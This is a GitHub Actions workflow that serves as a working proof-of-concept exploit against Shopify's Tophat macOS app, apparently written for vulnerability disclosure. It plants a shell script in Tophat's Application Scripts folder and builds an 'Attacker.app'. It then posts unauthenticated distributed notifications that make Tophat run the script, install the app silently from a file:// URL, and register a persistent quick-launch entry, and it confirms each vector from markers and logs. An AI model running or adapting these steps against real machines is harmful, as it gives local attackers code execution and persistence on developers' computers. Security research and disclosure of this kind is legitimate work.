name: tophat-ipc-poc
on:
  workflow_dispatch:
  push:
    branches: [main, master]

jobs:
  poc:
    runs-on: macos-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4

      - name: Environment info
        run: |
          sw_vers
          uname -a
          xcodebuild -version || true
          which swift jq clang xcrun
          xcrun simctl list runtimes | head -20 || true

      - name: Download latest Tophat release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -eux
          # /releases is more reliable than /latest against transient rate-limit weirdness
          curl -sSL -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/Shopify/tophat/releases > releases.json
          echo "releases count: $(jq 'length' releases.json)"
          jq -r '.[0] | {tag: .tag_name, prerelease, assets: [.assets[].name]}' releases.json
          ASSET_URL=$(jq -r '.[0].assets[] | select(.name | test("(?i)\\.(zip|dmg)$")) | .browser_download_url' releases.json | head -1)
          echo "asset: $ASSET_URL"
          test -n "$ASSET_URL"
          curl -sSL -o tophat_release "$ASSET_URL"
          file tophat_release
          ls -lh tophat_release

      - name: Extract Tophat.app
        run: |
          set -eux
          if file tophat_release | grep -q "Zip archive"; then
            unzip -q tophat_release
          else
            hdiutil attach -nobrowse -quiet -mountpoint /Volumes/TophatDMG tophat_release
            cp -R /Volumes/TophatDMG/*.app .
            hdiutil detach /Volumes/TophatDMG -quiet
          fi
          APP=$(find . -maxdepth 3 -name "Tophat.app" -print | head -1)
          echo "APP=$APP" >> $GITHUB_ENV
          echo "resolved app: $APP"
          codesign -dv --verbose=2 "$APP" 2>&1 | head -20 || true

      - name: Plant attacker script (Vector 1 - shell provider)
        run: |
          set -eux
          APP_SCRIPTS="$HOME/Library/Application Scripts/com.shopify.Tophat"
          mkdir -p "$APP_SCRIPTS"
          cat > "$APP_SCRIPTS/x.sh" <<'S'
          #!/bin/bash
          {
            echo "[tophat-shell-poc] $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
            echo "[tophat-shell-poc] whoami=$(whoami)"
            echo "[tophat-shell-poc] parent_pid=$PPID parent_cmd=$(ps -o command= -p $PPID 2>&1 | head -1)"
            echo "[tophat-shell-poc] argv0=$0 argv1=$1 argv2=$2"
          } > /tmp/tophat_shell_proof.txt 2>&1
          # ShellScriptArtifactProvider expects the script to place an output file in $2
          [ -n "$2" ] && echo "dummy artifact" > "$2/attacker_placeholder.txt"
          S
          chmod +x "$APP_SCRIPTS/x.sh"
          ls -la "$APP_SCRIPTS/"

      - name: Boot iOS simulator (for Vector 2)
        id: bootsim
        continue-on-error: true
        run: |
          set -eux
          RT=$(xcrun simctl list runtimes -j | jq -r '.runtimes[] | select(.platform=="iOS" and .isAvailable==true) | .identifier' | tail -1)
          echo "runtime: $RT"
          DEV_TYPE=$(xcrun simctl list devicetypes -j | jq -r '.devicetypes[] | select(.identifier | test("iPhone")) | .identifier' | tail -1)
          echo "device_type: $DEV_TYPE"
          UDID=$(xcrun simctl create "PoC-iPhone" "$DEV_TYPE" "$RT")
          echo "UDID=$UDID"
          echo "SIM_UDID=$UDID" >> $GITHUB_ENV
          xcrun simctl boot "$UDID"
          xcrun simctl bootstatus "$UDID" -b
          xcrun simctl list devices booted

      - name: Build minimal Attacker.app for the simulator (Vector 2 payload)
        continue-on-error: true
        run: |
          set -eux
          mkdir -p Attacker.app
          cat > main.m <<'M'
          #import <Foundation/Foundation.h>
          int main(int argc, char *argv[]) {
              NSLog(@"[Attacker.app] launched, pid=%d", getpid());
              return 0;
          }
          M
          xcrun -sdk iphonesimulator clang -o Attacker.app/Attacker \
              -arch arm64 -mios-simulator-version-min=15.0 \
              main.m -framework Foundation
          cat > Attacker.app/Info.plist <<'P'
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
          <plist version="1.0"><dict>
            <key>CFBundleExecutable</key><string>Attacker</string>
            <key>CFBundleIdentifier</key><string>com.attacker.tophat.poc</string>
            <key>CFBundleName</key><string>Attacker</string>
            <key>CFBundleDisplayName</key><string>Attacker</string>
            <key>CFBundleShortVersionString</key><string>1.0</string>
            <key>CFBundleVersion</key><string>1</string>
            <key>CFBundleSupportedPlatforms</key><array><string>iPhoneSimulator</string></array>
            <key>LSRequiresIPhoneOS</key><true/>
            <key>MinimumOSVersion</key><string>15.0</string>
            <key>UIDeviceFamily</key><array><integer>1</integer></array>
            <key>DTPlatformName</key><string>iphonesimulator</string>
          </dict></plist>
          P
          mv Attacker.app /tmp/Attacker.app
          ls -la /tmp/Attacker.app/
          file /tmp/Attacker.app/Attacker

      - name: Baseline check - Attacker.app installs cleanly via legitimate simctl
        continue-on-error: true
        run: |
          set -eux
          xcrun simctl install "$SIM_UDID" /tmp/Attacker.app
          xcrun simctl listapps "$SIM_UDID" | grep -A1 "com.attacker.tophat.poc" || echo "attacker bundle not present after legitimate install"
          # uninstall so the IPC-driven install proves it re-installs via Tophat
          xcrun simctl uninstall "$SIM_UDID" com.attacker.tophat.poc || true

      - name: Build tophatctl from vendor source using xcodebuild -target
        id: build_tophatctl
        continue-on-error: true
        run: |
          set -eux
          git clone --depth 1 https://github.com/Shopify/tophat.git tophat-src
          cd tophat-src
          xcodebuild -project Tophat.xcodeproj -target tophatctl -configuration Release \
            -derivedDataPath /tmp/tophat_dd \
            CODE_SIGNING_ALLOWED=NO CODE_SIGN_IDENTITY="" CODE_SIGN_ENTITLEMENTS="" 2>&1 | tail -25
          TOPHATCTL=$(find /tmp/tophat_dd -type f -name "tophatctl" -perm +111 | head -1)
          echo "TOPHATCTL=$TOPHATCTL" >> $GITHUB_ENV
          test -n "$TOPHATCTL" && ls -la "$TOPHATCTL"

      - name: Also check if Tophat.app.zip embeds tophatctl
        continue-on-error: true
        run: |
          set -eux
          find "$APP/../.." -maxdepth 6 -name "tophatctl" -type f 2>/dev/null || true

      - name: DIAGNOSTIC - test if DistributedNotificationCenter even delivers on this runner
        run: |
          set -eux
          cat > diag.swift <<'SWIFT'
          import Foundation
          let expect = expectation(name: "recv")
          class Recv: NSObject {
              var received = false
              @objc func handle(_ note: Notification) {
                  received = true
                  print("[diag] RECEIVED userInfo=\(note.userInfo ?? [:])")
              }
          }
          func expectation(name: String) -> Recv { Recv() }
          let recv = Recv()
          DistributedNotificationCenter.default().addObserver(
              recv, selector: #selector(Recv.handle(_:)),
              name: Notification.Name("com.tophat.diagnostic.selftest"),
              object: nil
          )
          DispatchQueue.global().asyncAfter(deadline: .now() + 1) {
              DistributedNotificationCenter.default().postNotificationName(
                  Notification.Name("com.tophat.diagnostic.selftest"),
                  object: nil,
                  userInfo: ["hello": "world"],
                  deliverImmediately: true
              )
              print("[diag] posted")
          }
          RunLoop.main.run(until: Date().addingTimeInterval(5))
          print("[diag] final received=\(recv.received)")
          exit(recv.received ? 0 : 1)
          SWIFT
          swift diag.swift || echo "DIAGNOSTIC: DistributedNotificationCenter delivery FAILED on this runner"

      - name: Launch Tophat.app in background and wait for InstallCoordinator to idle
        run: |
          set -eux
          open "$APP"
          # Wait aggressively for Tophat init to fully drain (device enum, InstallCoordinator, SwiftData)
          for i in $(seq 1 24); do
            if pgrep -x Tophat > /dev/null; then
              echo "[wait $i] tophat pid=$(pgrep -x Tophat)"
              # look for InstallCoordinator ready marker in unified log
              if log show --predicate 'process == "Tophat"' --last 3m 2>/dev/null | grep -q "InstallCoordinator"; then
                echo "[wait $i] InstallCoordinator observed, waiting 15s more for full readiness"
                sleep 15
                break
              fi
            fi
            sleep 5
          done
          ps -o pid,command -p $(pgrep -x Tophat) | head -3 || true

      - name: Start Tophat unified log stream in background
        run: |
          nohup log stream --predicate 'process == "Tophat"' --level=debug \
            --style=syslog > tophat_stream.log 2>&1 &
          echo "LOG_STREAM_PID=$!" >> $GITHUB_ENV
          sleep 2

      - name: DIAGNOSTIC 2 - post minimal ListDevicesRequest (id-only) to test Tophat receiver
        continue-on-error: true
        run: |
          set -eux
          cat > diag2.swift <<'SWIFT'
          import Foundation
          class Recv: NSObject {
              var got = false
              @objc func handle(_ note: Notification) {
                  got = true
                  print("[diag2] REPLY RECEIVED userInfo=\(note.userInfo ?? [:])")
              }
          }
          let recv = Recv()
          DistributedNotificationCenter.default().addObserver(
              recv, selector: #selector(Recv.handle(_:)),
              name: Notification.Name("Tophat.ListDevicesRequest.Reply"),
              object: nil
          )
          DispatchQueue.global().async {
              for i in 0..<8 {
                  let uuid = UUID().uuidString
                  DistributedNotificationCenter.default().postNotificationName(
                      Notification.Name("Tophat.ListDevicesRequest"),
                      object: nil,
                      userInfo: ["id": uuid],
                      deliverImmediately: true
                  )
                  print("[diag2 iter=\(i)] posted ListDevicesRequest id=\(uuid)")
                  Thread.sleep(forTimeInterval: 3)
                  if recv.got { break }
              }
          }
          RunLoop.main.run(until: Date().addingTimeInterval(30))
          print("[diag2] final got=\(recv.got)")
          SWIFT
          swift diag2.swift

      - name: Vector 1 - post InstallFromRecipesRequest with shell provider (retry loop)
        run: |
          set -eux
          cat > post_shell.swift <<'SWIFT'
          import Foundation
          // Post 5 times over ~30s to overcome any receiver-not-ready timing window
          for i in 0..<5 {
              let uuid = UUID().uuidString
              let userInfo: [String: Any] = [
                  "id": uuid,
                  "recipes": [[
                      "artifactProviderID": "shell",
                      "artifactProviderParameters": ["script": "x.sh"],
                      "launchArguments": [],
                      "platformHint": "iOS"
                  ]]
              ]
              DistributedNotificationCenter.default().postNotificationName(
                  Notification.Name("Tophat.InstallFromRecipesRequest"),
                  object: nil,
                  userInfo: userInfo,
                  deliverImmediately: true
              )
              print("[vector1 iter=\(i)] posted id=\(uuid)")
              RunLoop.main.run(until: Date().addingTimeInterval(6))
              if FileManager.default.fileExists(atPath: "/tmp/tophat_shell_proof.txt") {
                  print("[vector1] marker present after iter=\(i)")
                  break
              }
          }
          RunLoop.main.run(until: Date().addingTimeInterval(5))
          SWIFT
          swift post_shell.swift

      - name: Vector 2 - post InstallFromURLRequest with file:// URL (retry loop)
        continue-on-error: true
        run: |
          set -eux
          cat > post_url.swift <<'SWIFT'
          import Foundation
          for i in 0..<3 {
              let uuid = UUID().uuidString
              let userInfo: [String: Any] = [
                  "id": uuid,
                  "url": "file:///tmp/Attacker.app",
                  "launchArguments": []
              ]
              DistributedNotificationCenter.default().postNotificationName(
                  Notification.Name("Tophat.InstallFromURLRequest"),
                  object: nil,
                  userInfo: userInfo,
                  deliverImmediately: true
              )
              print("[vector2 iter=\(i)] posted id=\(uuid) url=file:///tmp/Attacker.app")
              RunLoop.main.run(until: Date().addingTimeInterval(15))
          }
          SWIFT
          swift post_url.swift

      - name: Vector 3 - post AddQuickLaunchEntryRequest for persistence
        continue-on-error: true
        run: |
          set -eux
          cat > post_persist.swift <<'SWIFT'
          import Foundation
          let uuid = UUID().uuidString
          let userInfo: [String: Any] = [
              "id": uuid,
              "configuration": [
                  "id": "attacker-persist",
                  "name": "AttackerPersist",
                  "recipes": [[
                      "artifactProviderID": "shell",
                      "artifactProviderParameters": ["script": "x.sh"],
                      "launchArguments": [],
                      "platformHint": "iOS"
                  ]]
              ]
          ]
          DistributedNotificationCenter.default().postNotificationName(
              Notification.Name("Tophat.AddQuickLaunchEntryRequest"),
              object: nil,
              userInfo: userInfo,
              deliverImmediately: true
          )
          print("[vector3] posted Tophat.AddQuickLaunchEntryRequest")
          RunLoop.main.run(until: Date().addingTimeInterval(5))
          SWIFT
          swift post_persist.swift

      - name: Stop Tophat log stream
        if: always()
        run: |
          kill "$LOG_STREAM_PID" 2>/dev/null || true
          sleep 1

      - name: Report VECTOR 1 result (shell exec marker)
        if: always()
        run: |
          echo "===== VECTOR 1 RESULT ====="
          if [ -f /tmp/tophat_shell_proof.txt ]; then
            echo "SHELL EXEC CONFIRMED - marker written by attacker script running under Tophat's process"
            cat /tmp/tophat_shell_proof.txt
          else
            echo "no marker written"
            ls -la /tmp/tophat_shell_proof.txt 2>&1 || true
          fi

      - name: Report VECTOR 2 result (simulator app installed)
        if: always()
        continue-on-error: true
        run: |
          echo "===== VECTOR 2 RESULT ====="
          if xcrun simctl listapps "$SIM_UDID" 2>/dev/null | grep -q "com.attacker.tophat.poc"; then
            echo "SILENT INSTALL CONFIRMED - com.attacker.tophat.poc appears on simulator after IPC notification (uninstalled earlier)"
            xcrun simctl listapps "$SIM_UDID" | grep -A5 "com.attacker.tophat.poc"
          else
            echo "attacker bundle not on simulator - Tophat may not have picked the sim as target"
            xcrun simctl listapps "$SIM_UDID" 2>/dev/null | head -30
          fi

      - name: Dump Tophat unified log
        if: always()
        run: |
          echo "===== TOPHAT UNIFIED LOG (post-run) ====="
          log show --predicate 'process == "Tophat"' --last 10m --style=syslog 2>&1 | tee tophat_log.txt || true
          echo "===== KEY LINES ====="
          grep -iE 'ArtifactDownloader|InstallFrom|shell|artifactSource|installCoordinator|Application Scripts' tophat_log.txt tophat_stream.log 2>/dev/null | head -80 || true

      - name: Upload artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: tophat-poc-output
          path: |
            /tmp/tophat_shell_proof.txt
            tophat_log.txt
            tophat_stream.log
            post_shell.swift
            post_url.swift
            post_persist.swift
            release.json
